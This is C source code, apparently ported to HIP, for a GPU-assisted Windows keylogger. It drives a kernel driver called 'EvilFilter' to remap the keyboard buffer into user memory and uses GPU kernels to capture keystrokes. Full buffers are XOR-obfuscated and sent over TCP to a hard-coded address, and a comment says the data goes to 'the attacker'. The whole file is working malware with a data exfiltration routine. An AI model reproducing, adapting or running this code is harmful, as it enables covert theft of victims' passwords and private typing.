#include "hip/hip_runtime.h"
#include "stdafx.h"
#include <SharedHeader.h>
#include <stdio.h>
#include <kernelspecs.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <io.h>
#include <windows.h>
#include <winbase.h>
#include <hip/hip_runtime.h>
#include <hip/hip_runtime.h>
#include "hip/hip_runtime_api.h"
#include ""
#include <DbgEng.h>
#include <process.h>
#include <psapi.h>
#include <time.h>
#include <scancode.h>

#include <winsock.h>

#define DEBUG 1


VOID pauseForABit(WORD secondsDelay) {

	printf("Waiting for %d seconds...", secondsDelay);
	SYSTEMTIME systemTime;
	GetSystemTime(&systemTime);
	WORD ExitMinute = systemTime.wMinute;
	WORD ExitSecond = systemTime.wSecond + secondsDelay;
	while (ExitSecond > 59) {
		ExitSecond = ExitSecond - 60;
		ExitMinute = ExitMinute + 1;
	}
	while (ExitMinute > 59) {
		ExitMinute = ExitMinute - 60;
	}
	WORD CurrentMinute = systemTime.wMinute;
	WORD CurrentSecond = systemTime.wSecond;


	while (TRUE) {
		GetSystemTime(&systemTime);
		CurrentMinute = systemTime.wMinute;
		CurrentSecond = systemTime.wSecond;
		if (CurrentMinute == ExitMinute && CurrentSecond >= ExitSecond) {
			break;
		}
	}
	printf("done waiting\n");
	return;
}
__global__ void copyKeyboardBuffer(PCHAR inBuffer, PCHAR outBuffer, PULONG keystrokeIndex) {
	int index = blockIdx.x*blockDim.x + threadIdx.x;
	if (index == 0) {
		outBuffer[index] = inBuffer[index] ^ 0x65 + 1;
		*keystrokeIndex = 0;
	}
	else {
		outBuffer[index] = inBuffer[index] ^ inBuffer[index - 1] ^ index + 1;
	}
}

__global__ void logKeyboardData(PKEYBOARD_INPUT_DATA keyboardData, PKEYBOARD_INPUT_DATA keyboardFlag, PCHAR KeyMap, PCHAR ExtendedKeyMap, PCHAR cudaBuffer, PUSHORT lastMake, PUSHORT lastModifier, PUSHORT shiftStatus, PULONG keystrokeIndex, PULONG previousState) {
	int index = blockIdx.x*blockDim.x + threadIdx.x;

	if (index == 0) {

		if (*lastMake != keyboardData->MakeCode || *lastModifier != keyboardFlag->Flags) {

			if (*keystrokeIndex < BUFFER_SIZE) {
				CHAR key = KeyMap[keyboardData->MakeCode];
				if (keyboardFlag->Flags == SP_KEY_MAKE || keyboardFlag->Flags == SP_KEY_BREAK) {

				} 
				else if (key == INVALID) {

				}
				else if (key == ENTER) {
					cudaBuffer[(*keystrokeIndex)++] = '\n';
				}
				else if (key == LSHIFT || key == RSHIFT) {
					if (keyboardFlag->Flags == KEY_MAKE) {
						*shiftStatus = 1;
					}
					else if (keyboardFlag->Flags == KEY_BREAK) {
						*shiftStatus = 0;
					}
				}
				else if (key == CTRL) {

				}
				else if (key == ALT) {

				}
				else if (key == SPACE) {
					cudaBuffer[(*keystrokeIndex)++] = ' ';
				}
				else if (*shiftStatus == 0) {
					cudaBuffer[(*keystrokeIndex)++] = KeyMap[keyboardData->MakeCode];
				}
				else if (*shiftStatus == 1) {
					cudaBuffer[(*keystrokeIndex)++] = ExtendedKeyMap[keyboardData->MakeCode];
				}
				else {
					cudaBuffer[(*keystrokeIndex)++] = KeyMap[keyboardData->MakeCode];
				}
			}
			printf("GPU: %s [%c][0x%x] unit[0x%x] flags[0x%x] res[0x%x] ext[0x%lx][0x%lx] index[%lu]\n",
				keyboardFlag->Flags == KEY_BREAK ? "Up  " : keyboardFlag->Flags == KEY_MAKE ? "Down" : "Unkn",
				KeyMap[keyboardData->MakeCode],
				keyboardData->MakeCode,
				keyboardData->UnitId,
				keyboardFlag->Flags,
				keyboardData->Reserved,
				keyboardData->ExtraInformation,
				keyboardFlag->ExtraInformation,
				*keystrokeIndex);

			*lastMake = keyboardData->MakeCode;
			*lastModifier = keyboardFlag->Flags;
				
		}
	}
}

/**
 * The overall strategy here is to make 2 calls to the driver obkect 
 * - the first is to get the offset for the pointer to the keyboard buffer
 * Then I loop through allocating variables until I get one with the correct 
 * offset.  
 * - the second call is with the pointer that has an identical offset
 * so that the driver can remap its page to the page with the keyboard buffer
 * 
 * once I have the mapped pointer I loop through the "logKeyboardData" CUDA routine 
 * to look for new keystrokes and hold them in a buffer until that buffer is filled. 
 * A full buffer is then encrypted as it is coppied via the "copyKeyboardBuffer" CUDA routine
 * The encrypted buffer is then transmitted to the attacker via a spawned thread while the 
 * original buffer goes back to listening for more keystrokes.
 */
int main(int argc, _TCHAR* argv[]) {
#define IOCTL_CUSTOM_CODE CTL_CODE(FILE_DEVICE_UNKNOWN, 0, METHOD_OUT_DIRECT, FILE_ANY_ACCESS)
	HANDLE hControlDevice;
	ULONG  bytes;

	hControlDevice = CreateFile(TEXT("\\\\.\\EvilFilter"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	if (INVALID_HANDLE_VALUE == hControlDevice) {
		printf("Failed to open EvilFilter device\n");
	}
	else {

		PKEYBOARD_INPUT_DATA keyboardData = NULL;
		PKEYBOARD_INPUT_DATA keyboardFlag = NULL;
		PKEYBOARD_INPUT_DATA tempKeyboard;
		PSHARED_MEMORY_STRUCT dataToTransmit;
		ULONG kmdfBufferOffset;
		ULONG kmdfFlagOffset;
		BOOLEAN largeBuffer;
		BOOLEAN largeFlag;
		ULONG keyboardOffset;
		ULONG flagOffset;
		PLLIST listNode;
		
		dataToTransmit = (PSHARED_MEMORY_STRUCT)malloc(SharedMemoryLength);

		// Get the Keyboard Offset
		dataToTransmit->instruction = 'O';
		dataToTransmit->offset = 0;

		// Get the Buffer Offset
		if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, NULL)) {
			printf("Ioctl to EvilFilter device (attempt to get offset) failed\n");
			CloseHandle(hControlDevice);
			return 1;
		}
		kmdfBufferOffset = dataToTransmit->offset;
		largeBuffer = dataToTransmit->largePage;
		printf("Ioctl to EvilFilter device succeeded...KMDF offset is [0x%lx]\n", kmdfBufferOffset);

		// Get the Flag Offset
		dataToTransmit->instruction = 'P';
		dataToTransmit->offset = 0;
		if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, NULL)) {
			printf("Ioctl to EvilFilter device (attempt to get offset) failed\n");
			CloseHandle(hControlDevice);
			return 1;
		}
		kmdfFlagOffset = dataToTransmit->offset;
		largeFlag = dataToTransmit->largePage;
		printf("Ioctl to EvilFilter device succeeded...KMDF Flag offset is [0x%lx]\nConstructing pointers.\n", kmdfFlagOffset);

		// create a pointer with the correct offset
		listNode = (PLLIST)malloc(sizeof(LLIST));
		listNode->keyboardBuffer = NULL;
		listNode->previous = NULL;

		while (!keyboardData || !keyboardFlag) {
			tempKeyboard = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
			if (largeBuffer) {
				keyboardOffset = (ULONG)tempKeyboard & 0x1fffff;
			}
			else {
				keyboardOffset = (ULONG)tempKeyboard & 0x0fff;
			}
			if (largeFlag) {
				flagOffset = (ULONG)tempKeyboard & 0x1fffff;
			}
			else {
				flagOffset = (ULONG)tempKeyboard & 0x0fff;
			}
			if (!keyboardData && keyboardOffset == kmdfBufferOffset) {
				keyboardData = tempKeyboard;
				printf("Found keyboardData [0x%lx]...", tempKeyboard);
			}
			else if (!keyboardFlag && flagOffset == kmdfFlagOffset) {
				keyboardFlag = tempKeyboard;
				printf("Found keyboardFlag [0x%lx]...", tempKeyboard);
			}
			else {
				PLLIST previousListNode = listNode;
				listNode = (PLLIST)malloc(sizeof(LLIST));
				listNode->keyboardBuffer = tempKeyboard;
				listNode->previous = previousListNode;
			}
		}

		printf("freeing unused memory...\n", keyboardData, keyboardFlag);
		while (listNode) {
			PLLIST currentListNode = listNode;
			listNode = listNode->previous;

			if (currentListNode->keyboardBuffer) {
				free(currentListNode->keyboardBuffer);
			}
			free(currentListNode);
		}

		// Get the Keyboard Buffer
		printf("fetching the KeyboardBuffer...");
		dataToTransmit->ClientMemory = keyboardData;
		dataToTransmit->instruction = 'E';
		if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, NULL )) {
			printf("Ioctl to EvilFilter device failed - unable to remap PTE\n");
			CloseHandle(hControlDevice);
			return 1;
		}
		printf("got it!\n\n");

		// Get the Keyboard Flag
		printf("fetching the keyboardFlag...");
		dataToTransmit->ClientMemory = keyboardFlag;
		dataToTransmit->instruction = 'F';
		if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, NULL)) {
			printf("Ioctl to EvilFilter device failed - unable to remap PTE\n");
			CloseHandle(hControlDevice);
			return 1;
		}
		printf("\nIoctl to EvilFilter device succeeded - we now have the real keyboard buffer.  KeyboardData=[0x%lx]\n", keyboardData);

		// now try to unhook the keyboard
		/**/
		dataToTransmit->instruction = 'U';
		if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, NULL)) {
			printf("Ioctl to EvilFilter device failed - unable to unhook keyboard - but that's ok.\n");
		}
		CloseHandle(hControlDevice);
		/**/


		/* send address to GPU */
		// set up GPU
		PKEYBOARD_INPUT_DATA d_KeyboardData;
		PKEYBOARD_INPUT_DATA d_KeyboardFlag;
		PCHAR d_KeyMap;
		PCHAR d_KeyMap2;
		PCHAR d_KeystrokeBuffer;
		PCHAR d_OutgoingKeystrokeBuffer;
		PCHAR h_OutgoingKeystrokeBuffer;
		PUSHORT d_lastMake;
		PUSHORT d_lastModifier;
		PUSHORT d_shiftStatus;
		PULONG d_keystrokeIndex;
		PULONG d_keyboardState;
		PULONG h_keystrokeIndex;
		USHORT init0 = 666U;
		ULONG init666long = 666LU;

		checkCudaErrors(hipSetDevice(0));
		checkCudaErrors(hipSetDeviceFlags(hipDeviceMapHost));

		h_keystrokeIndex = (PULONG)malloc(sizeof(ULONG));
		*h_keystrokeIndex = 0;
		h_OutgoingKeystrokeBuffer = (PCHAR)malloc(sizeof(CHAR) * BUFFER_SIZE);

		printf("Allocating device variables...");
		checkCudaErrors(hipMalloc(&d_lastMake,                sizeof(USHORT)));
		checkCudaErrors(hipMalloc(&d_lastModifier,            sizeof(USHORT)));
		checkCudaErrors(hipMalloc(&d_shiftStatus,             sizeof(USHORT)));
		checkCudaErrors(hipMalloc(&d_keyboardState,           sizeof(ULONG)));
		checkCudaErrors(hipMalloc(&d_KeystrokeBuffer,         sizeof(CHAR) * BUFFER_SIZE));
		checkCudaErrors(hipMalloc((void **)&d_KeyMap,         sizeof(char) * 84));
		checkCudaErrors(hipMalloc((void **)&d_KeyMap2,        sizeof(char) * 84));
		printf("Allocated\nZeroing out device variables...");
		checkCudaErrors(hipMemcpy(d_lastMake,         &init0,         sizeof(USHORT),    hipMemcpyHostToDevice));
		checkCudaErrors(hipMemcpy(d_lastModifier,     &init0,         sizeof(USHORT),    hipMemcpyHostToDevice));
		checkCudaErrors(hipMemcpy(d_shiftStatus,      &init0,         sizeof(USHORT),    hipMemcpyHostToDevice));
		checkCudaErrors(hipMemcpy(d_keyboardState,    &init666long,   sizeof(ULONG),     hipMemcpyHostToDevice));
		checkCudaErrors(hipMemcpy(d_KeyMap,           KeyMap,         84 * sizeof(char), hipMemcpyHostToDevice));	
		checkCudaErrors(hipMemcpy(d_KeyMap2,          ExtendedKeyMap, 84 * sizeof(char), hipMemcpyHostToDevice));	
		printf("Done.\n");

		printf("Registering KeyboardData, KeyboardFlag, OutgoingKeystrokeBuffer, and KeystrokeIndex for use by CUDA...\n");
		checkCudaErrors(hipHostRegister(keyboardData, sizeof(KEYBOARD_INPUT_DATA), hipHostRegisterMapped));
		checkCudaErrors(hipHostRegister(keyboardFlag, sizeof(KEYBOARD_INPUT_DATA), hipHostRegisterMapped));
		checkCudaErrors(hipHostRegister(h_OutgoingKeystrokeBuffer, sizeof(CHAR) * BUFFER_SIZE, hipHostRegisterMapped));
		checkCudaErrors(hipHostRegister(h_keystrokeIndex, sizeof(ULONG), hipHostRegisterMapped));
		printf("getting device pointer for KeyboardData, KeyboardFlag, OutgoingKeystrokeBuffer, and KeystrokeIndex...\n");
		checkCudaErrors(hipHostGetDevicePointer((void **)&d_KeyboardData, (void *)keyboardData, 0));
		checkCudaErrors(hipHostGetDevicePointer((void **)&d_KeyboardFlag, (void *)keyboardFlag, 0));
		checkCudaErrors(hipHostGetDevicePointer((void **)&d_OutgoingKeystrokeBuffer, (void *)h_OutgoingKeystrokeBuffer, 0));
		checkCudaErrors(hipHostGetDevicePointer((void **)&d_keystrokeIndex, (void *)h_keystrokeIndex, 0));

		printf("Launching CUDA process.\n");
		while (TRUE) { 
			logKeyboardData <<<1, 1 >>>(d_KeyboardData, d_KeyboardFlag, d_KeyMap, d_KeyMap2, d_KeystrokeBuffer, d_lastMake, d_lastModifier, d_shiftStatus, d_keystrokeIndex, d_keyboardState);
			checkCudaErrors(hipDeviceSynchronize());
			if (*h_keystrokeIndex >= BUFFER_SIZE) {
				printf("copying buffer.\n");
				copyKeyboardBuffer <<<32, 256 >>>(d_KeystrokeBuffer, d_OutgoingKeystrokeBuffer, d_keystrokeIndex);
				checkCudaErrors(hipDeviceSynchronize());
				printf("sending buffer.\n"); 
				CreateThread(NULL, 0, xmitBuffer, (LPVOID)h_OutgoingKeystrokeBuffer, 0, NULL);
			}
		}
	}
	return 0;
}



DWORD WINAPI xmitBuffer(LPVOID voidPointer) {
	int sock;
	struct sockaddr_in echoServAddr;
	USHORT echoServPort = 7;
	PCHAR servIP = "192.168.0.122";
	int echoStringLen;
	WSADATA wsaData;

	if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0) {
		fprintf(stderr, "WSAStartup() failed");
		return 1;
	}
	if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
		fprintf(stderr, "socket() failed");
		return 1;
	}

	memset(&echoServAddr, 0, sizeof(echoServAddr));
	echoServAddr.sin_family = AF_INET;
	echoServAddr.sin_addr.s_addr = inet_addr(servIP);
	echoServAddr.sin_port = htons(echoServPort);
	if (connect(sock, (struct sockaddr *) &echoServAddr, sizeof(echoServAddr)) < 0) {
		fprintf(stderr, "connect() failed");
		return 1;
	}
	PCHAR echoString = (PCHAR)voidPointer;
	echoStringLen = strlen(echoString);
	send(sock, echoString, echoStringLen, 0);
	closesocket(sock);
	WSACleanup();

	return 0;
}



